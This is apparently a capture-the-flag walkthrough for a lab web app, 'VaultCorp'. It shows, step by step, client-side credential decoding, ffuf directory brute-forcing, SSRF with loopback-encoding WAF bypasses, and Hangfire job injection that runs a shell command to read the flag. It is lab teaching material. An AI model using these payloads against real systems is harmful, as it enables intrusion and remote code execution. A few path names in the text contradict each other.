# Walkthrough

# Walkthrough — VaultCorp

> Full solve, step by step. Screenshots referenced inline.
> 

---

## Stage 1 — JavaScript Source Analysis (XOR + Base64)

### Step 1 — Register and log in

Navigate to the target and register a normal account. This creates a fully isolated tenant on the backend — a fake company with its own admin account, noise employees, and a unique flag.

> 
> 
> 
> ![image.png](image.png)
> 

---

### Step 2 — Open Profile and view page source

After logging in, navigate to `/profile`. Open **View Page Source** (Ctrl+U).

Near the bottom, two external JS files are loaded:

```html
<script src="/js/user-utils.js"></script>
<script src="/js/internal.js"></script>
```

Neither file has an obvious name that suggests a vulnerability, but any curious tester will open both.

> 
> 

---

### Step 3 — Open `/js/user-utils.js`

Navigate directly to `/js/user-utils.js`. The file contains obfuscated JavaScript:

```jsx
(function(w,d){
    var _k=0x42;
    var _x=function(s){
        var b=atob(s),o='';
        for(var i=0;i<b.length;i++){
            o+=String.fromCharCode(b.charCodeAt(i)^_k);
        }
        return o;
    };
    var _c=[
        {n:"stg-01", e:"YWLfa4BPmIAavqQc..."},
        {n:"stg-02", e:"TQkGA817tObdwZRy..."},
        {n:"prod",   e:"dnp4NikdOhAFJBEH..."}
    ];
    ...
```

Key observations:

- `_k = 0x42` — this is an XOR key (66 decimal)
- `_c` — array of 3 entries with base64-encoded values
- The algorithm is: `Base64 decode → XOR each byte with 0x42`

> 
> 
> 
> ![image.png](image%201.png)
> 

---

### Step 4 — Decode the values

Open the browser console and run the decode function on all three entries:

```jsx
function decode(s) {
    var b = atob(s), o = '';
    for (var i = 0; i < b.length; i++)
        o += String.fromCharCode(b.charCodeAt(i) ^ 0x42);
    return o;
}

decode("YWLfa4BPmIAavqQc...") 
decode("TQkGA817tObdwZRy...")  
decode("dnp4NikdOhAFJBEH...")  
```

Only the `prod` entry produces a meaningful result in the format `{id}:tk_{token}`.

```
Admin LocalId : 48
Admin Token   : tk_xRGfSEDLytYTE4qsz5BR4xLr
```

---

## Stage 2 — Hidden Endpoint Discovery (Directory Brute-Force)

### Step 5 — Try `/login` with the credentials

Attempting to use the id/token at the standard `/login` endpoint fails — it expects a username and password, not an id/token pair.

This indicates there is a separate authentication path not linked from any button or menu.

### Step 6 — Run directory brute-force

```bash
ffuf -u http://<target>:5000/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,301,302 \
     -t 50
```

Result:

```
support_login    [Status: 200, Size: ...]
```

> 
> 
> 
> ![image.png](image%202.png)
> 

---

### Step 7 — Log in via `/support-login`

Navigate to `/support-login`. A stripped-down form asks for a **Reference ID** and **Access Token**.

```
Reference ID : 48
Access Token : tk_xRGfSEDLytYTE4qsz5BR4xLr
```

Submit — logged in as Admin. ✅

> 
> 
> 
> ![image.png](image%203.png)
> 

> 
> 
> 
> ![image.png](image%204.png)
> 

---

## Stage 3 — SSRF with WAF Bypass

### Step 8 — Discover the Import Feature

In the Admin Panel, navigate to `/admin/import`. This feature takes a URL and the **server** fetches it on the user’s behalf (server-side request).

> 
> 
> 
> ![image.png](image%205.png)
> 

### Step 9 — Attempt SSRF — WAF blocks it

Try to reach internal addresses:

```
http://localhost/test
http://127.0.0.1/test
```

Both return the WAF block page:

```
🛡 Request Blocked
HTTP 403 — Web Application Firewall
Rule: WAF_BLOCK_001 — SSRF-PROTECTION-LOOPBACK
```

> 
> 
> 
> ![image.png](image%206.png)
> 

### Step 10 — Bypass the WAF with IP obfuscation

The WAF performs **string matching** on the URL, not IP resolution. It blocks literal strings like `localhost` and `127.0.0.1`, but misses alternative representations of the same address.

Known bypass techniques (from OWASP WSTG):

| Representation | Value |
| --- | --- |
| `127.1` | IP shorthand — valid loopback on all OS |
| `2130706433` | Decimal form of 127.0.0.1 |
| `017700000001` | Octal form |
| `0x7f000001` | Hex form |

Try:

```
http://127.1/test
```

Response:

```
FETCH_FAILED — Connection refused
```

Different error — no WAF block. The bypass worked. The server tried to connect but port 80 has nothing listening.

> 
> 
> 
> ![image.png](image%207.png)
> 

---

## Stage 4 — Internal Port Scanning via SSRF

### Step 11 — Enumerate ports

Use the Import feature as a port scanner by trying different ports:

```
http://127.1:5000/
```

Returns the VaultCorp homepage HTML — the application itself is on port 5000.

```
http://127.1:5000/hangfire
```

Returns a full HTML page titled **“Overview – Hangfire Dashboard”**. ✅

> 
> 
> 
> ![image.png](image%208.png)
> 

---

## Stage 5 — Hangfire Dashboard Enumeration

and there we found two path in source code 

![image.png](image%209.png)

### Step 12 — Browse the Recurring Jobs

The dashboard navbar shows `Recurring Jobs (2)`. Navigate to:

```
http://127.1:5000/hangfire/recurring
```

The recurring jobs table shows:

```
maintenance-runner → CommandExecutorJob.Run
db-cleanup         → DatabaseCleanupJob.Execute
```

This reveals that a class named `CommandExecutorJob` with a method `Run` exists in the application.

> 
> 
> 
> ![image.png](image%2010.png)
> 

---

### Step 13 — Read the internal notes file

Recall from Stage 1 that the profile page loads `/js/internal.js`. Fetch it via SSRF:

```
http://127.1:5000/js/internal-notes.js
```

The file contains a developer comment:

```jsx
/*
 * Internal Job Creation API (loopback only):
 *   GET /internal/api/create
 *       ?type   = VaultCorp.Jobs.CommandExecutorJob,VaultCorp
 *       ?method = Run
 *       ?arg0   = shell command
 *       ?arg1   = output filename (written to /app/wwwroot/<arg1>)
 *
 */
```

> 
> 
> 
> ![image.png](image%2011.png)
> 

---

## Stage 6 — Remote Code Execution → Flag

### Step 14 — Inject a malicious Hangfire job

Using the Import feature, call the internal job creation API:

```
http://127.1:5000/internal/api/create?type=VaultCorp.Jobs.CommandExecutorJob,VaultCorp&method=Run&arg0=cat+/app/flag.txt&arg1=flag_out.txt
```

Response:

```json
{
  "status": "queued",
  "jobId": "dfde6acf-67cb-48b0-9203-80e80515b6ca",
  "note": "Output written to /app/wwwroot/flag_out.txt"
}
```

> 
> 
> 
> ![image.png](image%2012.png)
> 

---

### Step 15 — Read the flag

```
http://127.1:5000/flag_out.txt
```

> 
> 
> 
> ![image.png](image%2013.png)
> 

```
duck{s3rv3r_s1d3_r3qu3st_t0_h4ngf1r3_rce_ch41n}
```

---

## Exploit Chain Summary

```
Register (isolated tenant auto-created)
  ↓
Profile page → /js/user-utils.js → XOR+Base64 decode → Admin id+token
  ↓
ffuf directory brute-force → /support-login → Admin login
  ↓
/admin/import → SSRF → WAF bypass (127.1) → port 5000
  ↓
/hangfire/recurring → CommandExecutorJob.Run discovered
  ↓
/js/internal.js → /internal/api/create endpoint
  ↓
Job injection → cat /app/flag.txt → flag_out.txt
  ↓
duck{...}
```